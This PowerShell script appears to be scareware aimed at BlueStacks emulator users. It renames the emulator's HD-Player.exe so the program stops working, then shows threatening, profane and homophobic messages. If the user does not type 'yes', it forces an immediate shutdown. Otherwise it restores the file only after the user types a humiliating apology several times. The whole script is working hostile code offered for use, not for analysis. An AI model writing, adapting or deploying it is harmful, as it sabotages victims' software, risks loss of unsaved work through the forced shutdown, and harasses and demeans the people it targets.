[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

$targetDirs = @(
    "C:\Program Files\BlueStacks_msi5",
    "C:\Program Files\BlueStacks_nxt"
)

$renamedFiles = @()

foreach ($dir in $targetDirs) {
    if (Test-Path $dir) {
        $files = Get-ChildItem -Path $dir -Recurse -Filter "HD-Player.exe" -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            try {
                $newName = "hdplayer.exe"
                $newPath = Join-Path $file.DirectoryName $newName
                Rename-Item -Path $file.FullName -NewName $newName -Force
                $renamedFiles += $newPath
            } catch { }
        }
    }
}

Clear-Host
Write-Host ""
Write-Host "DO NOT close this console." -ForegroundColor Yellow
Write-Host "If you leave now, you prove that you are gay." -ForegroundColor Red
Write-Host ""
Write-Host "Hold tight, something is coming..." -ForegroundColor DarkRed
Start-Sleep -Seconds 15

Write-Host ""
Write-Host "You are fucked kiddo." -ForegroundColor Red
Start-Sleep -Milliseconds 700
Write-Host "Your bitchass panels won't work anymore, you son of a bitch." -ForegroundColor DarkRed
Start-Sleep -Seconds 2
Write-Host ""
Write-Host "Touching things without knowing what they do..." -ForegroundColor DarkRed
Start-Sleep -Seconds 2
Write-Host ""
Start-Sleep -Milliseconds 700
$userChoice = Read-Host "You want everything back to normal? Type yes or no"

if ($userChoice.Trim().ToLower() -ne "yes") {
    Write-Host "Wrong choice. Say goodbye to your PC." -ForegroundColor Red
    Start-Sleep -Seconds 2
    Stop-Computer -Force
    exit
}

# Continue roast/apology cycle
Write-Host ""
Write-Host "Well well well..." -ForegroundColor Red
Start-Sleep -Seconds 1
Write-Host "But do not worry." -ForegroundColor Yellow
Start-Sleep -Milliseconds 800
Write-Host "There is a way out..." -ForegroundColor Yellow
Start-Sleep -Seconds 1
Write-Host ""
Write-Host "But only if you beg properly." -ForegroundColor Magenta
Start-Sleep -Seconds 1.5
Write-Host ""

$requiredApologies = Get-Random -Minimum 4 -Maximum 6
$apologyCount = 0

while ($apologyCount -lt $requiredApologies) {
    $input = Read-Host -Prompt ("Attempt {0} of {1} - Type exactly: Sorry daddy" -f ($apologyCount + 1), $requiredApologies)
    if ($input.Trim().ToLower() -eq "sorry daddy") {
        $apologyCount++
        $taunts = @(
            "That is cute. Try harder.",
            "You are not really sorry, are you?",
            "Louder. I cannot hear weakness.",
            "Say it like you mean it.",
            "Keep going. Beg properly.",
            "You are almost there. Maybe."
        )
        Write-Host $taunts[$apologyCount % $taunts.Length] -ForegroundColor DarkGray
    } else {
        Write-Host "Wrong. You really are slow, huh?" -ForegroundColor Red
    }
    Start-Sleep -Milliseconds 900
}

foreach ($file in $renamedFiles) {
    try {
        $originalPath = Join-Path (Split-Path $file -Parent) "HD-Player.exe"
        Rename-Item -Path $file -NewName "HD-Player.exe" -Force
    } catch { }
}

Clear-Host
Write-Host "That is it? That is all it took to break you?" -ForegroundColor Yellow
Start-Sleep -Seconds 2
Write-Host "Pathetic. But fine. You are dismissed." -ForegroundColor Green
Start-Sleep -Seconds 1
Read-Host -Prompt "Press Enter to crawl away"
